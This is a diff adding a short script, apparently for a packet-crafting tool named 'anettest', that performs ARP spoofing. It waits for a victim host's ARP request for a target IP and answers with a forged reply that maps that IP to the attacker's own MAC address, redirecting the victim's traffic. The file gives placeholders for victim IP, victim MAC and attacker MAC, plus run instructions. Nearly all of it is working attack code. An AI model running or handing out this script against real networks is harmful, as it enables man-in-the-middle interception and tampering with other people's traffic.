@@ -1,0 +1,48 @@
+/*
+   Arp spoofing. Waits for the defined arp request and sends reply to it.
+
+   run program as
+     anettest -d eth0 -f this_file.fws
+*/
+
+INCLUDE arp
+
+DEFINE neededIP 10.178.205.1       // input here the IP address of target host whose MAC will be asked in arp request
+DEFINE victimIP 10.178.205.138        // input here the IP address of the host which will be deceived
+DEFINE victimMac 00-03-25-07-d4-36   // input here the MAC address of the host which will be deceived
+DEFINE myMac e0-cb-4e-43-c8-39 		// address of a machine to which packet will be redirected
+
+var targetMAC arp.srcmac 00:00:00:00:00:00 autoset
+
+// description of the arp request to wait
+
+INCLUDE arp
+
+name "arp_request"
+
+arp.opcode = areq
+
+dstmac = 0xffffffffffff
+arp.dstip = neededIP
+
+arp.srcip = victimIP
+srcmac = victimMac
+arp.srcmac = victimMac
+
+      wait    // waits request
+
+// description of the arp reply
+
+INCLUDE arp
+
+srcmac = mymac
+dstmac = victimMac
+
+arp.opcode = arep
+arp.srcmac = mymac
+arp.dstmac = victimMac
+arp.srcip = neededIP
+arp.dstip = victimIP
+
+      SEND  // sends above packet
+
